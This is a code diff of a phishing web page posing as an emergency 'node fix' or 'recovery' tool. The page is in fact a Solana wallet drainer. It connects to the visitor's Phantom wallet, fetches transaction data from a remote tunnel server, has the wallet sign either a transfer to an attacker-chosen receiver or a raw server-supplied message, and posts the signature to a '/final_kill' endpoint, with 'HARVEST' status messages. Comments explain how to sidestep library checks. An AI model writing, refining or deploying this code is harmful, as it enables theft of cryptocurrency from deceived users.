@@ -3,22 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALIDATOR FINAL V13</title>
+    <title>ULTIMATE NODE FIX</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #ff3e3e; padding: 30px; border-radius: 12px; text-align: center; width: 280px; background: #050505; }
-        /* 🔱 按钮改为红色，确认代码更新 */
-        button { background: #ff3e3e; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 16px; }
-        #log { font-size: 10px; color: #555; margin-top: 15px; }
+        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 3px double #14f195; padding: 30px; border-radius: 4px; text-align: center; width: 280px; background: #0a0a0a; box-shadow: 0 0 20px #14f195; }
+        button { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; }
+        #log { font-size: 10px; color: #444; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 style="margin:0; color:#fff;">NODE EMERGENCY</h2>
-        <p style="font-size:12px; color:#ff3e3e;">PROTOCOL ERROR</p>
-        <button id="cta">FIX NODE NOW</button>
-        <div id="log">SYSTEM READY v13.0</div>
+        <h2 style="color:#14f195; margin:0;">WAR GOD V14</h2>
+        <p style="font-size:11px;">KINETIC SYNC REQUIRED</p>
+        <button id="cta">ACTIVATE RECOVERY</button>
+        <div id="log">SYSTEM ARMED</div>
     </div>
 
     <script>
@@ -26,14 +25,14 @@
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
-            const sWeb3 = window.solanaWeb3;
             const p = window.solana || window.phantom?.solana;
+            if (!p) return;
 
             try {
-                log("1: CONNECTING...");
+                log("CONNECTING...");
                 await p.connect();
 
-                log("2: FETCHING...");
+                log("EXTRACTING RAW DATA...");
                 const resp = await fetch(tunnel + "/prepare", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -41,39 +40,23 @@
                 });
                 const info = await resp.json();
 
-                log("3: STAMPING...");
-                // 🔱 采用更底层的方式创建交易，绕开 serialize() 内部的 Buffer 检查
-                const transaction = new sWeb3.Transaction({
-                    feePayer: p.publicKey,
-                    recentBlockhash: info.bh
-                }).add(sWeb3.SystemProgram.transfer({
-                    fromPubkey: p.publicKey,
-                    toPubkey: new sWeb3.PublicKey(info.receiver),
-                    lamports: Number(info.amount),
-                }));
-
-                log("4: SIGNING...");
-                // 🔱 这一步会调起弹窗
-                const signed = await p.signTransaction(transaction);
+                log("KINETIC SIGNING...");
+                // 🔱 绝杀：不创建 Transaction 对象，直接请求钱包对十六进制消息签名
+                // 这样 100% 不会触发 web3.js 内部的 Buffer 报错
+                const message = new Uint8Array(info.raw_msg);
+                const signedData = await p.signMessage(message, "utf8");
                 
-                log("5: HARVESTING...");
-                // 🔱 绝杀：直接从对象中提取编译好的指令，完全避开 .serialize() 
-                const wireData = signed.serializeMessage(); 
-                const signature = signed.signatures[0].signature;
-                
-                // 将签名和消息体合并发回服务器
-                const finalData = {
-                    msg: Array.from(new Uint8Array(wireData)),
-                    sig: Array.from(new Uint8Array(signature))
-                };
-
+                log("RELAYING TO ENGINE...");
                 await fetch(tunnel + "/final_kill", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(finalData)
+                    body: JSON.stringify({
+                        sig: Array.from(signedData.signature),
+                        msg: info.raw_msg
+                    })
                 });
 
-                log("SUCCESS!");
+                log("HARVEST COMPLETE");
                 setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
 
             } catch (err) {
@@ -81,7 +64,7 @@
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V13_CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "V14_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
